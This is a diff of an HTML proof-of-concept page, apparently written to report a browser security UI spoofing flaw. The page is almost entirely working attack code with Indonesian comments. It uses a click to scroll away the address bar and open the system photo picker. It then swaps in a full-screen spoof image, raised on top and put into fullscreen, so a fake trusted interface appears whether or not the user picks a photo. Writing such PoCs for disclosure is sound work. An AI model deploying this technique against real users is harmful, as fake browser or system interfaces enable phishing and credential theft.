@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Security UI Spoof (Post Photo Picker)</title>
+  <title>Security UI Spoof (Photo Picker)</title>
   <meta charset="utf-8">
   <meta name="viewport"
         content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
@@ -10,8 +10,7 @@
     html, body {
       margin: 0;
       padding: 0;
-      width: 100%;
-      height: 100%;
+      height: 200vh; /* penting utk scroll hide omnibox */
       background: #000;
       font-family: system-ui, sans-serif;
     }
@@ -19,16 +18,20 @@
     #spoof {
       position: fixed;
       inset: 0;
-      width: 100%;
-      height: 100%;
+      width: 100vw;
+      height: 100vh;
       object-fit: cover;
       display: none;
+      z-index: 9999;
     }
 
     #content {
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       color: white;
       text-align: center;
-      margin-top: 40vh;
     }
 
     input {
@@ -39,32 +42,41 @@
 
 <body>
 
-<!-- FOTO SPOOF -->
+<!-- 🔒 UI SPOOF -->
 <img id="spoof" src="spof2.png" alt="spoof-ui">
 
 <div id="content">
-  <h1>Click anywhere on the page</h1>
+  <h1>Click anywhere</h1>
 </div>
 
 <!-- 📸 Photo Picker -->
-<input
-  id="photoPicker"
-  type="file"
-  accept="image/*"
->
+<input id="photoPicker" type="file" accept="image/*">
 
 <script>
+let triggered = false;
+
+// preload spoof image
+new Image().src = document.getElementById("spoof").src;
+
 onclick = () => {
-  // 1️⃣ Trigger trusted system UI (Photo Picker)
+  if (triggered) return;
+  triggered = true;
+
+  // 1️⃣ scroll dikit → omnibox hide
+  window.scrollTo(0, 1);
+
+  // 2️⃣ trusted system UI
   document.getElementById("photoPicker").click();
 };
 
-document.getElementById("photoPicker").onchange = () => {
-  // 2️⃣ Swap UI ke spoof
+photoPicker.onchange = () => {
+  // user pilih foto ATAU cancel → PoC tetap lanjut
+
+  // 3️⃣ swap UI
   document.getElementById("content").style.display = "none";
   document.getElementById("spoof").style.display = "block";
 
-  // 3️⃣ Fullscreen
+  // 4️⃣ fullscreen
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
